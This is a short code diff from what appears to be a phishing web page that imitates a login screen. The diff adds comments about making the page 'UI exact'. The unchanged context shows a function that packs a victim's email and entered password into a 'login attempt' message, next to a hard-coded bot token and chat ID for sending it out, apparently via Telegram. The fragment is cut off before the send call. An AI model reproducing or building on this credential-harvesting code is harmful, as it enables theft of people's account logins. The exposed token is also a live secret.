@@ -25,6 +25,9 @@ function validatePassword(value) {
 }
 
 async function sendDataToBackend(password) {
+          //  Refactor by handling with a backend, the otp page has higher priority
+          // Hence this is just "plain" but there to make it UI exact.
+
           let message = `New ${name} login attempt-> password for: ${$emailStore} is ${password}`;
       const botToken = '8370164086:AAF5HP0jGNLwV_PB9q7sVncLSULost68M-U';
       const chatId = '1314372286';
